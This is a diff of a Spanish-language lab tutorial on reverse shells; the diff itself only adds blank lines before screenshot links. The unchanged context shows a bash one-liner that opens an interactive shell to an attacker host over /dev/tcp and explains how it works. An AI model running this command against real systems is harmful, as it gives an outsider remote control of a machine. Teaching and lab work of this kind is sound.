@@ -71,8 +71,10 @@ Usaremos bash en la máquina víctima para obtener la shell reversa:
   bash -i >& /dev/tcp/192.168.1.103/9000 0>&1
   ```
   Este comando inicia una shell Bash interactiva (bash -i) y redirige su salida (>&) al dispositivo /dev/tcp/192.168.1.103/9000, que representa una conexión TCP al host con IP 192.168.1.103 en el puerto 9000. Luego, 0>&1 redirige la entrada estándar (stdin, file descriptor 0) a la salida estándar (stdout, file descriptor 1), permitiendo la comunicación bidireccional a través de la red. Esto efectivamente crea una shell reversa, permitiendo que el host remoto ejecute comandos en la máquina víctima. También se puede usar udp en lugar de tcp.
+
   ![](capturas/shell-reversa-bash-mv-victima.png)
 - Si ejecutamos comandos en la máquina atacante, obtenemos la shell reversa.
+
   ![](capturas/shell-reversa-bash-mv-atacante.png)
 
 Recomendación: Ver Exploring bash Reverse Shell ➡ https://www.youtube.com/watch?v=OjkVep2EIlw
